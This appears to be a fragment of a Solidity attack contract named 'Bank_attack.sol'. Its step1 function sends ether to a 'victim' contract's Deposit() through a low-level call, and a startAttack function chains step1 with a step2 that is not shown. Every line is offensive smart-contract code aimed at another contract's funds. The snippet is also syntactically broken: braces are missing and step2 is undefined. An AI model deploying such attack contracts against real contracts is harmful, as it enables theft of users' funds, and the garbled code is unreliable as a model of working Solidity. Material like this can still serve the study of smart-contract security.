Bank_attack.sol
function step1(uint256 amount)  payable {
if (this.balance >= amount) {
victim.call.value(amount)(bytes4(keccak256("Deposit()")));
function startAttack(uint256 amount)  {
step1(amount);
step2(amount / 2);
